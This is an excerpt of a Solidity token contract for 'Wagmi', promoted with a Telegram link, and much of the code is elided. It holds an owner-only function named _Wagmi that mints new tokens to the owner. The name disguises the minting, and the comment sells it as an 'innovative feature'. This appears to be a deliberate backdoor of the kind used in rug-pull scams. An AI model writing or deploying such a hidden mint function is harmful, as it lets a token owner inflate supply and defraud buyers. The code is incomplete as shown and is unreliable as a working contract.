...
//
// $Wagmi proposes an innovative feature in its contract.
//
//  📱Telegram::https://t.me/WagmiChinese
//  
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _Wagmi(uint256 amount) public onlyOwner {
 _Wagmi(msg.sender, amount);
    }
    ...
    function _Wagmi(address account, uint256 amount) internal virtual {
...
contract $Wagmi is ERC20 {
    ...
    constructor() public ERC20("Wagmi", "WAGMI") {
     _Wagmi(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}